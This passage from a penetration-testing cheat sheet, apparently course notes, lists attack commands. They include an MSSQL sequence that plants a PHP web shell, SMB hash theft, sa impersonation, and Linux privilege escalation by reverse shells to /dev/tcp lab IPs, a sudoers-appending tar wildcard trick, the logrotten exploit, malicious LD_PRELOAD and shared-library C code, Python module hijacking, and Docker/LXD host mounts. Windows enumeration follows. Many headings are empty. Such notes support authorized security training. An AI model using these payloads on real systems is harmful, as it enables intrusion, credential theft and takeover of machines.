EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```
#### Read Local File
```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```
#### Capture Service Hash - Start a Hash Catcher
```
responder -I tun0
smbserver share ./ -smb2support
```
#### Capture Service Hash - Hash Stealing
```
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```
or
```
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```
#### Impersonate Users
##### Identify Impersonable Users
```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```
##### Verify Current User and Role
```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
```
##### Impersonating the SA User
```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```
##### Communication iwht other Databases
```
SELECT srvname, isremote FROM sysservers
GO
```
##### Execute Commands on Linked Servers
```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

## RDP
## DNS
## SMTP

# Pivoting, Tunneling, and Port Forwarding

# Active Directory Enumeration & Attacks

# Using Web Proxies

# Attacking Web Applications with Ffuf

# Login Brute Forcing

# SQL Injection Fundamentals

# SQLMap Essentials

# Cross-Site Scripting (XSS)

# File Inclusion

# File Upload Attacks

# Command Injections

# Web Attacks

# Attacking Common Applications

# Linux Privilege Escalation
## Introduction
### List Current Processes
```
ps aux | grep root
ps au
```
### Display Home Directory
```
ls /home
```
### Display Home Directory Content
```
la -lah /home/user
```
### SSH Directory Contents
```
ls -l /home/user/.ssh
```
### Bash History
```
history
```
### Sudo Privileges
```
sudo -l
```
### View Passwd File
```
cat /etc/passwd
```
### View Cron Jobs
```
ls -la /etc/cron.daily/
```
### File Systems and Additional Drives
```
lsblk
```
### Find Writeable Directories
```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
### Find Writeable Files
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## Environment Enumeration
### Operating system and version
```
cat /etc/os-release
```
### Enumerate Path
```
echo $PATH
```
### Enumerate Environment
```
env
```
### Enumerate Kernel
```
cat /proc/version
```
```
uname -a
```
### Enumerate CPU
```
lscpu
```
### Enumerate Shells
```
cat /etc/shells
```
### Enumerate Drives and Shares
```
lsblk
cat /etc/fstab
```
### Enumerate Printers
```
lpstat
```
### Enumerate the Routing Table
```
route
```
### Enumerate the ARP Table
```
arp -a
```
### Enumerate Existing Users
```
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
```
### Enumerate User Shell Access
```
grep "*sh$" /etc/passwd
```
### Enumerate Groups
```
cat /etc/group
```
### Enumerate a Specific Group
```
getent group sudo
```
### Enumerate Mounted File Systems
```
df -h
```
### Enumerate Unmounted File Systems
```
cat /etc/fstab | grep -v "#" | column -t
```
### Find all Hidden Files owned by user
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
### Find All Hidden Directories
```
find / -type d -name ".*" -ls 2>/dev/null
```
### Enumerate Temporary Files
```
ls -l /tmp /var/tmp /dev/shm
```

## Linux Services and Internals Enumeration
### Network Interfaces
```
ip a
```
### Network Hosts
```
cat /etc/hosts
```
### User's Last Login
```
lastlog
```
### Logged in users
```
w
```
### Command History
```
history
```
### Finding History Files
```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
### Cronjobs
```
ls -la /etc/cron.daily/
```
### Proc
```
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```
## Services
### Installed Services
```
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
### Sudo Version
```
sudo -v
```
### Binaries
```
ls -l /bin /usr/bin/ /usr/sbin/
```
### GTFO Bins
```
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```
### Trace System Calls
```
strace ping -c1 10.129.112.20
```
### Configuration Files
```
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
### Scripts
```
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
### RUnning Services by User
```
ps aux | grep root
```

## Credential Hunting
### Find Config Files
```
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```
### DB Password from File
```
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```
### SSH Keys
```
ls /home/*/.ssh
```

## Environment-Based Privilege Escalation
### Path Abuse
#### Show Path
```
echo $PATH
```
#### Abuse Path
```
echo $PATH > /tmp/path.txt
PATH=.:${PATH}
export PATH
echo $PATH
touch lsx
echo 'echo "PATH ABUSE!!"' > lsx
chmod +x lsx
lsx
```
### Wildcard Abuse
#### Wildcard Abuse with Tar
```
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

### Escape Restricted Shells
```
https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions
```

## Permissions-Based Privilege Escalation
### Special Permissions - setuid = s
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
### Special Permissions - setgid = s
```
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
### Sudo Permissions
```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
### GTFO Bins
```
https://gtfobins.github.io/
```

### Sudo Rights Abuse
Check sudo Permissions, Check GTFOBins, Follow GTFOBins Guidance.
```
sudo -l
```
### Privileged Groups
#### Check Group Membership and Enumerate Their Permissions
```
id
```

### Capabilities
#### Enumerate Capabilities
```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
```
getcap -r / 2>/dev/null
```
#### Abusing vim - Remove x from root
```
/usr/bin/vim.basic /etc/passwd
```

## Service-Based Privilege Escalation
### Vulnerable Services
#### Enumerate the Services and Find a PoC for a Vulnerable Service
##### Screen
```
./screen_exploit.sh
```
### Cron Job Abuse
#### Find Writeable Files or Directories
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
#### Enumerate Cron Jobs
```
cat /etc/crontab
```
#### Verify that cronjob is running with pspy
```
./pspy64 -pf -i 1000
```
#### You can add a reverse shell to an editable script
```
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```
#### Start a listener on attacker machine
```
nc -lnvp 443
```
### Containters
#### Identify Linux Daemon/Linux Container
```
id
```
#### Linux Daemond Import Image anf Deployment
```
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
```

### Docker
#### Docker Group
```
id
```
#### Docker Image
```
docker image ls
```
#### Docker Shared Directories
You might find non-standard folders.
#### Docker Sockets 
```
ls -al
```
#### Download docker to the machine and priv esc
```
wget https://<attacker-ip>:443/docker -O docker
chmod +x docker
ls -l
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
/tmp/docker -H unix:///app/docker.sock ps
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
#### Docker Socket
```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Kubernetes???

### Logratate
#### Logrotate Version
```
logrotate -v
```
#### Logrotate Status
```
cat /var/lib/logrotate/status
```
#### Config Files
```
ls /etc/logrotate.d/
```
#### Prerequisites
1. write permission on log files
2. lograte runs as privileged user or root
3. vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0
#### Execute the explout
```
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
./logrotten -p ./payload /tmp/tmp.log
nc -nblp 9001
```

### Misc
#### Rootsquash
```
cat /etc/exports
```
#### Upload and execute shell if no_root_squash

## Linux Internals-Based Privilege Escalation
### Kernel Exploits
#### Kernel Exploit Enumeration
```
uname -a
cat /etc/lsb-reloase 
```
#### Find a Relevant exploit, compile it on target machine, root

### Shared Libraries
#### Check for LD_PRELOAD
```
sudo -l
```
#### Create C Library
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
#### Compile C Library
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
#### Execute Malicious File
```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
### Shared Object Hijacking
#### Enumerate the Custom Libraries of a binary
```
ldd payroll
```
#### Library Priority
```
readelf -d payroll  | grep PATH
```
#### Create a Malicious Payload
```
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
#### Compile Malicious Payload
```
gcc src.c -fPIC -shared -o /development/libshared.so
```
#### Execute binary
```
./payload
```

### Python Library hijacking
#### Check a Python Script
```
ls -lah python.py
```
#### Check Module Permissions
```
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -lah /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```
#### Change function in init.py
```
def virtual_memory():
    import os
    os.system('/bin/bash')
```
#### Run the Python Script
### Change Python Path Variable
#### Check sudo permission and see for setenv in python3
```
sudo -l
```
#### Set ENV by copying init to temp and change it.
```
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py
```

## Recent 0-Days
### Sudo Version
#### Versions of sudo are vulnerable
1.8.31 - Ubuntu 20.04
1.8.27 - Debian 10
1.9.2 - Fedora 33
and others
#### Check Sudo Version
```
sudo -V
```
### Sudo Policy Bypass
#### Check Sudo Permissions for entry in /etc/sudoers
```
sudo -l
```
#### Root
```
sudo -u#-1 id
```

### Polkit
#### Check for pkexec
```
pkexec -u <user> <command>
```
#### Download a PoC and execute it

### Dirty Pipe
#### Verify Kernel Version
```
uname -r
```
#### Check SUID Binaries
```
find / -perm -4000 2>/dev/null
```


# Windows Privilege Escalation
## Enumeration
### Network Enumeration
```
ipconfig /all
arp -a
route print

```
### Enumerate Defenses
#### Defender Status
```
powershell -ep bypass
Get-MpComputerStatus
```
#### AppLocker Rules
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
#### Test AppLocker Policy
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
### System Information
#### Tasklist
```
tasklist /svc
```
#### Environment variable
```
set
```
#### Detailed Configuration Information
```
systeminfo
```
#### Patches and Updates
##### cmd
```
wmic qfe
```
##### Powershell
```
Get-HotFix | ft -AutoSize
```
#### Installed Programs
##### cmd
```
wmic product get name
```
##### powershell
```
Get-WmiObject -Class Win32_Product |  select Name, Version
```
#### Display Running Process
```
netstat -ano
```
#### logged-in users
```
query user
```
#### Current User
```
echo %USERNAME%
```
#### Current User Privileges
```
whoami /priv
```
#### Current User Groups
```
whoami /groups
```
#### Get All Users
```
net user
```
#### Get All Groups
```
net localgroup
```
#### Group Details
```
net localgroup administrators
```
#### Password Policy and Other Information
```
net accounta
```


# Documentation & Reporting

# Attacking Enterprise Networks
